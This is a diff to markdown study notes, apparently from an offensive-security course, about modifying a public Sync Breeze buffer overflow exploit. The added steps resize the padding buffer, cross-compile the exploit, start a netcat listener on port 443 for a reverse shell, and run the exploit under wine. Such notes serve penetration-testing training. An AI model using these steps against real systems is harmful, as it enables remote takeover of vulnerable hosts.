@@ -633,7 +633,20 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
 
      sudo wine syncbreeze_exploit.exe
      ```
-   - application crashes and the EIP register seems to be overwritten by "0x9010090c"  
+   - application crashes and the EIP register seems to be overwritten by "0x9010090c"
+- Changing the overflow buffer
+   - Allocating memory for the initial buffer using malloc `int initial_buffer_size = 780;`  
+   - Filling the initial buffer with "A" character `memset(padding, 0x41, initial_buffer_size);`  
+   - Memset setting the last byte to a null-terminator to convert the buffer into a string `memset(padding + initial_buffer_size - 1, 0x00, 1);`  
+   - Creating the final buffer for the exploit
+   - Changing the padding allocation size `int initial_buffer_size = 781;`
+   - compile the code and start netcat listener on port 443
+     `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`
+     `sudo nc -lvp 443`
+   - run the exploit
+     `wine syncbreeze_exploit.exe`
+- **Fixing web exploits**
+  - 
      
 ### 15. Antivirus evasion
 ### 16. Password attacks
